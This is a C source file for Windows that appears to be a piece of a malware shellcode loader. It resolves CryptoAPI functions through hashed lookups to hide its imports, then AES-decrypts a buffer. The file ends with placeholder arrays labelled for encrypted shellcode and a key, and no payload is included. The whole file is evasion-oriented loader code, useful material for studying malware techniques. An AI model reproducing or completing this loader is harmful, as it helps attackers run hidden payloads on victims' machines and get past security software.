#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>


typedef BOOL(WINAPI* pCryptAcquireContextW)(
    HCRYPTPROV* phProv,
    LPCWSTR    szContainer,
    LPCWSTR    szProvider,
    DWORD      dwProvType,
    DWORD      dwFlags
    );

typedef BOOL(WINAPI* pCryptCreateHash)(
    HCRYPTPROV hProv,
    ALG_ID     Algid,
    HCRYPTKEY  hKey,
    DWORD      dwFlags,
    HCRYPTHASH* phHash
    );


typedef BOOL(WINAPI* pCryptHashData)(
    HCRYPTHASH hHash,
    const BYTE* pbData,
    DWORD      dwDataLen,
    DWORD      dwFlags
    );


typedef BOOL(WINAPI* pCryptDeriveKey)(
    HCRYPTPROV hProv,
    ALG_ID     Algid,
    HCRYPTHASH hBaseData,
    DWORD      dwFlags,
    HCRYPTKEY* phKey
    );


typedef BOOL(WINAPI* pCryptDecrypt)(
    HCRYPTKEY  hKey,
    HCRYPTHASH hHash,
    BOOL       Final,
    DWORD      dwFlags,
    BYTE* pbData,
    DWORD* pdwDataLen
    );

typedef BOOL(WINAPI* pCryptReleaseContext)(
    HCRYPTPROV hProv,
    DWORD      dwFlags
    );

typedef BOOL(WINAPI* pCryptDestroyHash)(
    HCRYPTHASH hHash
    );


typedef BOOL(WINAPI* pCryptDestroyKey)(
    HCRYPTKEY hKey
    );





int AESDecrypt(char* payload, unsigned int payload_len, char* key, size_t keylen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;
    pCryptAcquireContextW fnCryptAcquireContextW =
        (pCryptAcquireContextW)GetProcAddressReplacement(LoadLibraryA("Advapi32.dll"), 0x8DAD3D22);

    pCryptCreateHash fnCryptCreateHash =
        (pCryptCreateHash)GetProcAddressReplacement(LoadLibraryA("Advapi32.dll"), 0x0FE55971);

    pCryptHashData fnCryptHashData =
        (pCryptHashData)GetProcAddressReplacement(LoadLibraryA("Advapi32.dll"), 0x626D7F0C);

    pCryptDeriveKey fnCryptDeriveKey =
        (pCryptDeriveKey)GetProcAddressReplacement(LoadLibraryA("Advapi32.dll"), 0x8C6D90CB);

    pCryptDecrypt fnCryptDecrypt =
        (pCryptDecrypt)GetProcAddressReplacement(LoadLibraryA("Advapi32.dll"), 0xC19B70CD);

    pCryptReleaseContext fnCryptReleaseContext =
        (pCryptReleaseContext)GetProcAddressReplacement(LoadLibraryA("Advapi32.dll"), 0x7C402C0C);

    pCryptDestroyHash fnCryptDestroyHash =
        (pCryptDestroyHash)GetProcAddressReplacement(LoadLibraryA("Advapi32.dll"), 0x9B818EE3);

    pCryptDestroyKey fnCryptDestroyKey =
        (pCryptDestroyKey)GetProcAddressReplacement(LoadLibraryA("Advapi32.dll"), 0x78F020AA);


    if (!fnCryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        printf("CryptAcquireContextW failed: %d\n", GetLastError());
        return -1;
    }
    if (!fnCryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        printf("CryptCreateHash failed: %d\n", GetLastError());
        return -1;
    }
    if (!fnCryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {
        printf("CryptHashData failed: %d\n", GetLastError());
        return -1;
    }
    if (!fnCryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        printf("CryptDeriveKey failed: %d\n", GetLastError());
        return -1;
    }

    if (!fnCryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, payload, &payload_len)) {
        printf("CryptDecrypt failed: %d\n", GetLastError());
        return -1;
    }

    fnCryptReleaseContext(hProv, 0);
    fnCryptDestroyHash(hHash);
    fnCryptDestroyKey(hKey);

    return 0;
}

const unsigned char Shellcode[] = {
    // Replace this with encrypted Shellcode
};

unsigned char Key[] = {
    // Replace this with Key
};